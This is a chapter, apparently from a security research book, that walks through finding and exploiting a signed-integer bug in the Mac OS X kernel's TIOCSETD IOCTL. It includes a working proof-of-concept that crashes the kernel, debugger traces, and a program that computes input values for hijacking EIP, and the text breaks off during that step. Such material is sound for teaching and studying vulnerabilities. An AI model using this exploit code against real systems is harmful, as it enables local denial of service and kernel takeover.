<html><head></head><body><div class="chapter" title="Chapter&#xA0;7.&#xA0;A Bug Older Than 4.4BSD"><div class="titlepage"><div><div><h1 class="title"><a id="a_bug_older_than_4.4bsd"/>Chapter 7. A Bug Older Than 4.4BSD</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Saturday, March 3, 2007</em></span><a id="IDX-CHP-7-0001" class="indexterm"/><a id="IDX-CHP-7-0002" class="indexterm"/></p><p><span class="emphasis"><em>Dear Diary</em></span>,</p></div><p>Last week my Apple MacBook finally arrived. After getting acquainted with the Mac OS X platform, I decided to take a closer look at the XNU kernel of OS X. After a few hours of digging through the kernel code, I found a nice bug that occurs when the kernel tries to handle a special TTY IOCTL. The bug was easy to trigger, and I wrote a POC code that allows an unprivileged local user to crash the system via kernel panic. As usual, I then tried to develop an exploit to see if the bug allows arbitrary code execution. At this point, things got a bit more complicated. To develop the exploit code, I needed a way to debug the OS X kernel. That’s not a problem if you own two Macs, but I only had one: my brand-new MacBook.<a id="IDX-CHP-7-0003" class="indexterm"/><a id="IDX-CHP-7-0004" class="indexterm"/><a id="IDX-CHP-7-0005" class="indexterm"/><a id="IDX-CHP-7-0006" class="indexterm"/></p><div class="sect1" title="7.1 Vulnerability Discovery"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_discovery-id5"/>7.1 Vulnerability Discovery</h1></div></div></div><p>First I downloaded the latest source code release of the XNU kernel,<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-1" class="footnoteref">75</a>]</sup> and then I searched for a vulnerability in the following way:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>I used an Intel Mac with OS X 10.4.8 and kernel version xnu-792.15.4.obj~4/ RELEASE_I386 as a platform throughout this chapter</em></span>.</p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: List the IOCTLs of the kernel.</p></li><li class="listitem"><p>Step 2: Identify the input data.</p></li><li class="listitem"><p>Step 3: Trace the input data.</p></li></ul></div><p>These steps will be detailed in the following sections.</p><div class="sect2" title="Step 1: List the IOCTLs of the Kernel"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_list_the_ioctls_of_the"/>Step 1: List the IOCTLs of the Kernel</h2></div></div></div><p>To generate a list of the IOCTLs of the kernel, I simply searched the kernel source code for the usual IOCTL macros. Every IOCTL is assigned its own number, which is usually created by a macro. Depending on the IOCTL type, the XNU kernel of OS X defines the following macros: <code class="literal">_IOR</code>, <code class="literal">_IOW</code>, and <code class="literal">_IOWR</code>.</p><a id="I_programlisting7_d1e7671"/><pre class="programlisting">osx$ <strong class="userinput"><code>pwd</code></strong>
/Users/tk/xnu-792.13.8

osx$ <strong class="userinput"><code>grep -rnw -e _IOR -e _IOW -e _IOWR *</code></strong>
[..]
xnu-792.13.8/bsd/net/bpf.h:161:#define BIOCGRSIG        _IOR('B',114, u_int)
xnu-792.13.8/bsd/net/bpf.h:162:#define BIOCSRSIG        _IOW('B',115, u_int)
xnu-792.13.8/bsd/net/bpf.h:163:#define BIOCGHDRCMPLT    _IOR('B',116, u_int)
xnu-792.13.8/bsd/net/bpf.h:164:#define BIOCSHDRCMPLT    _IOW('B',117, u_int)
xnu-792.13.8/bsd/net/bpf.h:165:#define BIOCGSEESENT     _IOR('B',118, u_int)
xnu-792.13.8/bsd/net/bpf.h:166:#define BIOCSSEESENT     _IOW('B',119, u_int)
[..]</pre><p>I now had a list of IOCTLs supported by the XNU kernel. To find the source files that implement the IOCTLs, I searched the whole kernel source for each IOCTL name from the list. Here’s an example of the <code class="literal">BIOCGRSIG</code> IOCTL:</p><a id="I_programlisting7_d1e7684"/><pre class="programlisting">osx$ <strong class="userinput"><code>grep --include=*.c -rn BIOCGRSIG *</code></strong>
xnu-792.13.8/bsd/net/bpf.c:1143:        case BIOCGRSIG:</pre></div><div class="sect2" title="Step 2: Identify the Input Data"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_identify_the_input_data-id3"/>Step 2: Identify the Input Data</h2></div></div></div><p>To identify the user-supplied input data of an IOCTL request, I took a look at some of the kernel functions that process the requests. I discovered that such functions typically expect an argument called <code class="literal">cmd</code> of type <code class="literal">u_long</code> and a second argument called <code class="literal">data</code> of type <code class="literal">caddr_t</code>.</p><p>Here are some examples:</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>xnu-792.13.8/bsd/netat/at.c</em></span></p></dd></dl></div><a id="I_programlisting7_d1e7717"/><pre class="programlisting">[..]
135 int
136 at_control(so, <strong class="userinput"><code>cmd</code></strong>, <strong class="userinput"><code>data</code></strong>, ifp)
137      struct socket *so;
138      <strong class="userinput"><code>u_long cmd;</code></strong>
139      <strong class="userinput"><code>caddr_t data;</code></strong>
140      struct ifnet *ifp;
141 {
[..]</pre><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>xnu-792.13.8/bsd/net/if.c</em></span></p></dd></dl></div><a id="I_programlisting7_d1e7740"/><pre class="programlisting">[..]
1025 int
1026 ifioctl(so, <strong class="userinput"><code>cmd</code></strong>, <strong class="userinput"><code>data</code></strong>, p)
1027     struct socket *so;
1028     <strong class="userinput"><code>u_long cmd;</code></strong>
1029     <strong class="userinput"><code>caddr_t data;</code></strong>
1030     struct proc *p;
1031 {
[..]</pre><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>xnu-792.13.8/bsd/dev/vn/vn.c</em></span></p></dd></dl></div><a id="I_programlisting7_d1e7763"/><pre class="programlisting">[..]
877 static int
878 vnioctl(dev_t dev, <strong class="userinput"><code>u_long cmd</code></strong>, <strong class="userinput"><code>caddr_t data</code></strong>,
879     __unused int flag, struct proc *p,
880     int is_char)
881 {
[..]</pre><p>The names of these function arguments are quite descriptive: The <code class="literal">cmd</code> argument holds the requested IOCTL code, and the <code class="literal">data</code> argument holds the user-supplied IOCTL data.</p><p>On Mac OS X, an IOCTL request is typically sent to the kernel using the <code class="literal">ioctl()</code> system call. This system call has the following prototype:<a id="IDX-CHP-7-0007" class="indexterm"/><a id="IDX-CHP-7-0008" class="indexterm"/></p><a id="I_programlisting7_d1e7795"/><pre class="programlisting">osx$ <strong class="userinput"><code>man ioctl</code></strong>
[..]
<strong class="userinput"><code>SYNOPSIS</code></strong>
   <strong class="userinput"><code>#include &lt;sys/ioctl.h&gt;</code></strong>

   int
   <strong class="userinput"><code>ioctl</code></strong>(<span class="underline">int</span> <span class="underline">d</span>, <span class="underline">unsigned</span> <span class="underline">long</span> <span class="underline">request</span>, <span class="underline">char</span> <span class="underline">*argp</span>);

<strong class="userinput"><code>DESCRIPTION</code></strong>
   The <strong class="userinput"><code>ioctl()</code></strong> function manipulates the underlying device parameters of spe-
   cial files. In particular, many operating characteristics of character
   special files (e.g. terminals) may be controlled with <strong class="userinput"><code>ioctl()</code></strong> requests.
   The argument <span class="underline">d</span> must be an open file descriptor.

   An ioctl <span class="underline">request</span> has encoded in it whether the argument is an "in"
   parameter or "out" parameter, and the size of the argument <span class="underline">argp</span> in
   bytes. Macros and defines used in specifying an ioctl <span class="underline">request</span> are
   located in the file &lt;<span class="underline">sys/ioctl.h</span>&gt;.
[..]</pre><p>If an IOCTL request is sent to the kernel, the argument <code class="literal">request</code> has to be filled with the appropriate IOCTL code, and <code class="literal">argp</code> has to be filled with the user-supplied IOCTL input data. The <code class="literal">request</code> and <code class="literal">argp</code> arguments of <code class="literal">ioctl()</code> correspond to the kernel function arguments <code class="literal">cmd</code> and <code class="literal">data</code>.</p><p>I had found what I was looking for: Most kernel functions that process incoming IOCTL requests take an argument called <code class="literal">data</code> that holds, or points to, the user-supplied IOCTL input data.</p></div><div class="sect2" title="Step 3: Trace the Input Data"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_trace_the_input_data-id3"/>Step 3: Trace the Input Data</h2></div></div></div><p>After I found the locations in the kernel where IOCTL requests are handled, I traced the input data through the kernel functions while looking for potentially vulnerable locations. While reading the code, I stumbled upon some locations that looked intriguing. The most interesting potential bug I found happens if the kernel tries to handle a special TTY IOCTL request. The following listing shows the relevant lines from the source code of the XNU kernel.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>xnu-792.13.8/bsd/kern/tty.c</em></span></p></dd></dl></div><a id="I_programlisting7_d1e7900"/><pre class="programlisting">[..]
 816    /*
 817     * Ioctls for all tty devices.  Called after line-discipline specific ioctl
 818     * has been called to do discipline-specific functions and/or reject any
 819     * of these ioctl commands.
 820     */
 821    /* ARGSUSED */
 822    int
 823    ttioctl(register struct tty *tp,
 824       <strong class="userinput"><code>u_long cmd</code></strong>, <strong class="userinput"><code>caddr_t data</code></strong>, int flag,
 825       struct proc *p)
 826    {
[..]
 <strong class="userinput"><code>872       switch (cmd) {            /* Process the ioctl. */</code></strong>
[..]
<strong class="userinput"><code>1089       case TIOCSETD: {        /* set line discipline */</code></strong>
<strong class="userinput"><code>1090           register int t = *(int *)data;</code></strong>
1091           dev_t device = tp-&gt;t_dev;
1092
<strong class="userinput"><code>1093           if (t &gt;= nlinesw)</code></strong>
1094               return (ENXIO);
<strong class="userinput"><code>1095           if (t != tp-&gt;t_line) {</code></strong>
1096               s = spltty();
1097               (*linesw[tp-&gt;t_line].l_close)(tp, flag);
<strong class="userinput"><code>1098               error = (*linesw[t].l_open)(device, tp);</code></strong>
1099               if (error) {
1100                   (void)(*linesw[tp-&gt;t_line].l_open)(device, tp);
1101                   splx(s);
1102                   return (error);
1103               }
1104               tp-&gt;t_line = t;
1105               splx(s);
1106           }
1107           break;
1108       }
[..]</pre><p>If a <code class="literal">TIOCSETD</code> IOCTL request is sent to the kernel, the switch case in line 1089 is chosen. In line 1090, the user-supplied <code class="literal">data</code> of type <code class="literal">caddr_t</code>, which is simply a typedef for <code class="literal">char *</code>, is stored in the signed int variable <code class="literal">t</code>. Then in line 1093, the value of <code class="literal">t</code> is compared with <code class="literal">nlinesw</code>. Since <code class="literal">data</code> is supplied by the user, it’s possible to provide a string value that corresponds to the unsigned integer value of <code class="literal">0x80000000</code> or greater. If this is done, <code class="literal">t</code> will have a negative value due to the type conversion in line 1090. <a class="xref" href="ch07.html#example_program_that_demonstrates_the" title="Example 7-1. Example program that demonstrates the type conversion behavior (conversion_bug_example.c)">Example 7-1</a> illustrates how <code class="literal">t</code> can become negative:<a id="IDX-CHP-7-0009" class="indexterm"/></p><div class="example"><a id="example_program_that_demonstrates_the"/><p class="title">Example 7-1. Example program that demonstrates the type conversion behavior (<span class="emphasis"><em>conversion_bug_example.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    typedef char *  caddr_t;
02
03    // output the bit pattern
04    void
05    bitpattern (int a)
06    {
07           int             m       = 0;
08           int             b       = 0;
09           int             cnt     = 0;
10           int             nbits   = 0;
11           unsigned int    mask    = 0;
12
13           nbits = 8 * sizeof (int);
14           m = 0x1 &lt;&lt; (nbits - 1);
15
16           mask = m;
17           for (cnt = 1; cnt &lt;= nbits; cnt++) {
18                   b = (a &amp; mask) ? 1 : 0;
19                   printf ("%x", b);
20                   if (cnt % 4 == 0)
21                           printf (" ");
22                   mask &gt;&gt;= 1;
23           }
24           printf ("\n");
25    }
26
27    int
28    main ()
29    {
30           caddr_t data    = "\xff\xff\xff\xff";
31           int     t       = 0;
32
33           t = *(int *)data;
34
35           printf ("Bit pattern of t: ");
36           bitpattern (t);
37
38           printf ("t = %d (0x%08x)\n", t, t);
39
40           return 0;
41    }</pre></div></div><p>Lines 30, 31, and 33 are nearly identical to lines in the OS X kernel source code. In this example, I chose the hardcoded value <code class="literal">0xffffffff</code> as IOCTL input data (see line 30). After the type conversion in line 33, the bit patterns, as well as the decimal value of <code class="literal">t</code>, are printed to the console. The example program results in the following output when it’s executed:</p><a id="I_programlisting7_d1e7985"/><pre class="programlisting">osx$ <strong class="userinput"><code>gcc -o conversion_bug_example conversion_bug_example.c</code></strong>

osx$ <strong class="userinput"><code>./conversion_bug_example</code></strong>
Bit pattern of t: 1111 1111 1111 1111 1111 1111 1111 1111
t = −1 (0xffffffff)</pre><p>The output shows that <code class="literal">t</code> gets the value −1 if a character string consisting of 4 <code class="literal">0xff</code> byte values is converted into a signed int. See Section A.3 for more information on type conversions and the associated security problems.</p><p>If <code class="literal">t</code> is negative, the check in line 1093 of the kernel code will return <code class="literal">FALSE</code> because the signed int variable <code class="literal">nlinesw</code> has a value greater than zero. If that happens, the user-supplied value of <code class="literal">t</code> gets further processing. In line 1098, the value of <code class="literal">t</code> is used as an index into an array of function pointers. Since I could control the index into that array, I could specify an arbitrary memory location that would be executed by the kernel. This leads to full control of the kernel execution flow. Thank you, Apple, for the terrific bug. <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e8019"/><img src="httpatomoreillycomsourcenostarchimages939227.png" alt=""/></span></p><p>Here is the anatomy of the bug, as diagrammed in <a class="xref" href="ch07.html#description_of_the_vulnerability_that_i" title="Figure 7-1. Description of the vulnerability that I discovered in the XNU kernel of OS X">Figure 7-1</a>:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>The function pointer array <code class="literal">linesw[]</code> gets referenced.</p></li><li class="listitem"><p>The user-controlled value of <code class="literal">t</code> is used as an array index for <code class="literal">linesw[]</code>.</p></li><li class="listitem"><p>A pointer to the assumed address of the <code class="literal">l_open()</code> function gets referenced based on the user-controllable memory location.</p></li><li class="listitem"><p>The assumed address of <code class="literal">l_open()</code> gets referenced and called.</p></li><li class="listitem"><p>The value at the assumed address of <code class="literal">l_open()</code> gets copied into the instruction pointer (<code class="literal">EIP</code> register).</p></li></ol></div><div class="figure"><a id="description_of_the_vulnerability_that_i"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8069"/><img src="httpatomoreillycomsourcenostarchimages939323.png.jpg" alt="Description of the vulnerability that I discovered in the XNU kernel of OS X"/></div></div><p class="title">Figure 7-1. Description of the vulnerability that I discovered in the XNU kernel of OS X</p></div><p>Because the value of <code class="literal">t</code> is supplied by the user (see (2)), it is possible to control the address of the value that gets copied into <code class="literal">EIP</code>.</p></div></div></div>
<div class="sect1" title="7.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id5"/>7.2 Exploitation</h1></div></div></div><p>After I found the bug, I did the following to gain control over <code class="literal">EIP</code>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Trigger the bug to crash the system (denial of service).</p></li><li class="listitem"><p>Step 2: Prepare a kernel-debugging environment.</p></li><li class="listitem"><p>Step 3: Connect the debugger to the target system.</p></li><li class="listitem"><p>Step 4: Get control over <code class="literal">EIP</code>.</p></li></ul></div><div class="sect2" title="Step 1: Trigger the Bug to Crash the System (Denial of Service)"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_trigger_the_bug_to_crash_th"/>Step 1: Trigger the Bug to Crash the System (Denial of Service)</h2></div></div></div><p>Once I had found the bug, it was easy to trigger it and cause a system crash. All I had to do was send a malformed <code class="literal">TIOCSETD</code> IOCTL request to the kernel. <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a> shows the source code of the POC I developed to cause a crash.</p><div class="example"><a id="poc_code_open_parenthesis-id1"/><p class="title">Example 7-2. POC code (<span class="emphasis"><em>poc.c</em></span>) I wrote to trigger the bug I found in the kernel of OS X</p><div class="example-contents"><pre class="programlisting">01    #include &lt;sys/ioctl.h&gt;
02
03    int
04    main (void)
05    {
06       unsigned long    ldisc = 0xff000000;
07
08       ioctl (0, TIOCSETD, &amp;ldisc);
09
10       return 0;
11    }</pre></div></div><p>A brand-new MacBook: $1,149. An LED Cinema Display Monitor: $899. Crashing a Mac OS X system with only 11 lines of code: priceless.</p><p>I then compiled and tested the POC code as an unprivileged user:</p><a id="I_programlisting7_d1e8128"/><pre class="programlisting">osx$ <strong class="userinput"><code>uname -a</code></strong>
Darwin osx 8.8.3 Darwin Kernel Version 8.8.3: Wed
 Oct 18 21:57:10 PDT 2006;                            →
 root:xnu-792.15.4.obj~/RELEASE_I386 i386 i386

osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>Immediately after executing the POC code, I got the standard crash screen of Mac OS X,<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-2" class="footnoteref">76</a>]</sup> as shown in <a class="xref" href="ch07s02.html#mac_os_x_kernel_panic_message" title="Figure 7-2. Mac OS X kernel panic message">Figure 7-2</a>.</p><div class="figure"><a id="mac_os_x_kernel_panic_message"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8150"/><img src="httpatomoreillycomsourcenostarchimages939325.png.jpg" alt="Mac OS X kernel panic message"/></div></div><p class="title">Figure 7-2. Mac OS X kernel panic message</p></div><p>If such a kernel panic occurs, the details of the crash are added to a log file in the folder <span class="emphasis"><em>/Library/Logs/</em></span>. I rebooted the system and opened that file.<a id="IDX-CHP-7-0010" class="indexterm"/></p><a id="I_programlisting7_d1e8163"/><pre class="programlisting">osx$ <strong class="userinput"><code>cat /Library/Logs/panic.log</code></strong>
Sat Mar 3 13:30:58 2007
panic(cpu 0 caller 0x001A31CE): Unresolved kernel trap (CPU 0, Type
 14=page fault), registers:
CR0: 0x80010033, CR2: 0xe0456860, CR3: 0x00d8a000, CR4: 0x000006e0
EAX: 0xe0000000, EBX: 0xff000000, ECX: 0x04000001, EDX: 0x0386c380
CR2: 0xe0456860, EBP: 0x250e3d18, ESI: 0x042fbe04, EDI: 0x00000000
EFL: 0x00010287, EIP: 0x0035574c, CS:  0x00000008, DS:  0x004b0010

Backtrace, Format - Frame : Return Address (4 potential args on stack)
0x250e3a68 : 0x128d08 (0x3c9a14 0x250e3a8c 0x131de5 0x0)
0x250e3aa8 : 0x1a31ce (0x3cf6c8 0x0 0xe 0x3ceef8)
0x250e3bb8 : 0x19a874 (0x250e3bd0 0x1 0x0 0x42fbe04)
0x250e3d18 : 0x356efe (0x42fbe04 0x8004741b 0x250e3eb8 0x3)
0x250e3d68 : 0x1ef4de (0x4000001 0x8004741b 0x250e3eb8 0x3)
0x250e3da8 : 0x1e6360 (0x250e3dd0 0x297 0x250e3e08 0x402a1f4)
0x250e3e08 : 0x1de161 (0x3a88084 0x8004741b 0x250e3eb8 0x3)
0x250e3e58 : 0x330735 (0x4050440
*********</pre><p>It appeared that I could crash the system as an unprivileged user. Could I also execute arbitrary code in the privileged context of the OS X kernel? To answer that question, I had to peer inside the inner workings of the kernel.<a id="IDX-CHP-7-0011" class="indexterm"/><a id="IDX-CHP-7-0012" class="indexterm"/><a id="IDX-CHP-7-0013" class="indexterm"/><a id="IDX-CHP-7-0014" class="indexterm"/><a id="IDX-CHP-7-0015" class="indexterm"/></p></div><div class="sect2" title="Step 2: Prepare a Kernel-Debugging Environment"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_prepare_a_kernel-debugging"/>Step 2: Prepare a Kernel-Debugging Environment</h2></div></div></div><p>At this point I needed to be able to debug the kernel. As I mentioned earlier, this is no problem if you own two Macs, but I had only one MacBook at hand. Therefore, I had to find another way to debug the kernel. I solved the problem by building and installing Apple’s GNU debugger on a Linux host and then connecting the host to my MacBook. Instructions for building such a debugger host system are described in Section B.5.</p></div><div class="sect2" title="Step 3: Connect the Debugger to the Target System"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_connect_the_debugger_to_the"/>Step 3: Connect the Debugger to the Target System</h2></div></div></div><p>After I had built Apple’s gdb on a Linux host, I linked the systems with an Ethernet crossover cable, as shown in <a class="xref" href="ch07s02.html#my_setup_for_remotely_debugging_the_kern" title="Figure 7-3. My setup for remotely debugging the kernel of Mac OS X">Figure 7-3</a>.</p><div class="figure"><a id="my_setup_for_remotely_debugging_the_kern"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8204"/><img src="httpatomoreillycomsourcenostarchimages939327.png.jpg" alt="My setup for remotely debugging the kernel of Mac OS X"/></div></div><p class="title">Figure 7-3. My setup for remotely debugging the kernel of Mac OS X</p></div><p>I then started the Mac OS X target system, enabled remote kernel debugging, and rebooted the system so that the changes could take effect:<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-3" class="footnoteref">77</a>]</sup><a id="IDX-CHP-7-0016" class="indexterm"/></p><a id="I_programlisting7_d1e8215"/><pre class="programlisting">osx$ <strong class="userinput"><code>sudo nvram boot-args="debug=0x14e"</code></strong>

osx$ <strong class="userinput"><code>sudo reboot</code></strong></pre><p>After the Mac OS X target machine had restarted, I booted the Linux host and made sure that I could connect to the target machine:</p><a id="I_programlisting7_d1e8224"/><pre class="programlisting">linux$ <strong class="userinput"><code>ping -c1 10.0.0.2</code></strong>
PING 10.0.0.2 (10.0.0.2) from 10.0.0.3 : 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.08 ms

--- 10.0.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% loss, time 0ms
rtt min/avg/max/mdev = 1.082/1.082/1.082/0.000 ms</pre><p>I added a permanent ARP entry for the target on the Linux system to establish a robust connection between the two machines, ensuring that the connection wouldn’t be dropped while the kernel of the target machine was being debugged:</p><a id="I_programlisting7_d1e8231"/><pre class="programlisting">linux$ <strong class="userinput"><code>su -</code></strong>
Password:

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] on eth0

linux# <strong class="userinput"><code>arp -s 10.0.0.2 00:17:F2:F0:47:19</code></strong>

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] <strong class="userinput"><code>PERM</code></strong> on eth0</pre><p>I then logged in to the Mac OS X system as an unprivileged user and generated a nonmaskable interrupt (NMI) by tapping the system’s power button. That gave me the following output on the screen of the MacBook:</p><a id="I_programlisting7_d1e8250"/><pre class="programlisting">Debugger called: &lt;Button SCI&gt;
Debugger called: &lt;Button SCI&gt;
cpu_interrupt: sending enter debugger signal (00000002) to cpu 1
ethernet MAC address: 00:17:f2:f0:47:19
ethernet MAC address: 00:17:f2:f0:47:19
ip address: 10.0.0.2
ip address: 10.0.0.2

Waiting for remote debugger connection.</pre><p>Back on the Linux host, I started the kernel debugger (see Section B.5 for more information on how to build this gdb version):</p><a id="I_programlisting7_d1e8255"/><pre class="programlisting">linux# <strong class="userinput"><code>gdb_osx KernelDebugKit_10.4.8/mach_kernel</code></strong>
GNU gdb 2003-01-28-cvs (Mon Mar  5 16:54:25 UTC 2007)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "--host= --target=i386-apple-darwin".</pre><p>I then instructed the debugger to use Apple’s kernel debug protocol (kdp):</p><a id="I_programlisting7_d1e8262"/><pre class="programlisting">(gdb) <strong class="userinput"><code>target remote-kdp</code></strong></pre><p>Once the debugger was running, I attached to the kernel of the target system for the first time:</p><a id="I_programlisting7_d1e8268"/><pre class="programlisting">(gdb) <strong class="userinput"><code>attach 10.0.0.2</code></strong>
Connected.
0x001a8733 in lapic_dump () at /SourceCache/xnu/xnu-792.13.8/osfmk/i386/mp.c:332
332             int     i;</pre><p>As the debugger output shows, it seemed to work! The OS X system was frozen at that time, so I continued the execution of the kernel with the following debugger command:</p><a id="I_programlisting7_d1e8275"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>Now everything was set up for remotely debugging the kernel of the Mac OS X target system.</p></div><div class="sect2" title="Step 4: Get Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_get_control_over_eip"/>Step 4: Get Control over EIP</h2></div></div></div><p>After I had successfully connected the debugger to the kernel of the target system, I opened a terminal on the Mac OS X machine and again executed the POC code described in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>:</p><a id="I_programlisting7_d1e8289"/><pre class="programlisting">osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X system froze immediately, and I got the following debugger output on the Linux host:<a id="IDX-CHP-7-0017" class="indexterm"/></p><a id="I_programlisting7_d1e8301"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
0x0035574c in ttsetcompat (tp=0x37e0804, com=0x8004741b,
 data=0x2522beb8 "",                     → term=0x3)
 at /SourceCache/xnu/xnu-792.13.8/bsd/kern/tty_compat.c:145
145      */</pre><p>To see what exactly caused the <code class="literal">SIGTRAP</code> signal, I looked at the last executed kernel instruction (see Section B.4 for a description of the following debugger commands):</p><a id="I_programlisting7_d1e8308"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</pre><p>Apparently, the crash occurred when the kernel tried to call an address referenced by the <code class="literal">EAX</code> register. Next, I looked at the register values:</p><a id="I_programlisting7_d1e8318"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
<strong class="userinput"><code>eax            0xe0000000</code></strong>       −536870912
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0xff000000       −16777216
esp            0x2522bc18       0x2522bc18
ebp            0x2522bd18       0x2522bd18
esi            0x37e0804        58591236
edi            0x0              0
eip            0x35574c         0x35574c
eflags         0x10287          66183
cs             0x8              8
ss             0x10             16
ds             0x4b0010         4915216
es             0x340010         3407888
fs             0x25220010       622985232
gs             0x48             72</pre><p>The debugger output shows that <code class="literal">EAX</code> had a value of <code class="literal">0xe0000000</code>. It wasn’t apparent to me where this value came from, so I disassembled the instructions around <code class="literal">EIP</code>:</p><a id="I_programlisting7_d1e8337"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/6i $eip - 15</code></strong>
<strong class="userinput"><code>0x35573d &lt;ttsetcompat+123&gt;:     mov    %ebx,%eax</code></strong>
<strong class="userinput"><code>0x35573f &lt;ttsetcompat+125&gt;:     shl    $0x5,%eax</code></strong>
0x355742 &lt;ttsetcompat+128&gt;:     mov    %esi,0x4(%esp,1)
0x355746 &lt;ttsetcompat+132&gt;:     mov    0xffffffa8(%ebp),%ecx
0x355749 &lt;ttsetcompat+135&gt;:     mov    %ecx,(%esp,1)
<strong class="userinput"><code>0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</code></strong></pre><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Note that the disassembly is in AT&amp;T style</em></span>.<a id="IDX-CHP-7-0018" class="indexterm"/></p></div><p>At address <code class="literal">0x35573d</code>, the value of <code class="literal">EBX</code> is copied into <code class="literal">EAX</code>. The next instruction modifies this value by a left shift of 5 bits. At address <code class="literal">0x35574c</code>, the value is used to calculate the operand of the <code class="literal">call</code> instruction. So where did the value of <code class="literal">EBX</code> come from? A quick look at the register values revealed that <code class="literal">EBX</code> was holding the value <code class="literal">0xff000000</code>, the value I had supplied as input data for the <code class="literal">TIOCSETD</code> IOCTL. The value <code class="literal">0xe0000000</code> was the result of a left shift of my supplied input value by 5 bits. As expected, I was able to control the memory location used to find the new value for the <code class="literal">EIP</code> register. The modification of my supplied input data can be expressed as<a id="IDX-CHP-7-0019" class="indexterm"/></p><a id="I_programlisting7_d1e8401"/><pre class="programlisting">address of the new value for EIP = (IOCTL input data value &lt;&lt; 5) + 0x456860</pre><p>I could get an appropriate <code class="literal">TIOCSETD</code> input data value for a specific memory address in either of two ways: I could try to solve the mathematical problem, or I could brute force the value. I decided to go with the easy option and wrote the following program to brute force the value:</p><div class="example"><a id="code_that_i_wrote_to_brute_force_the"/><p class="title">Example 7-3. Code that I wrote to brute force the <code class="literal">TIOCSETD</code> input data value (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
02
03    #define MEMLOC          0x10203040
04    #define SEARCH_START    0x80000000
05    #define SEARCH_END      0xffffffff
06
07    int
08    main (void)
09    {
10       unsigned int    a, b = 0;
11
12       for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
13           b = (a &lt;&lt; 5) + 0x456860;
14           if (b == MEMLOC) {
15               printf ("Value: %08x\n", a);
16               return 0;
17           }
18       }
19
20       printf ("No valid value found.\n");
21
22       return 1;
23    }</pre></div></div><p>I wrote this program to answer this question: What <code class="literal">TIOCSETD</code> input data do I have to send to the kernel in order to get the value at memory address <code class="literal">0x10203040</code> copied into the <code class="literal">EIP</code> register?</p><a id="I_programlisting7_d1e8430"/><pre class="programlisting">osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
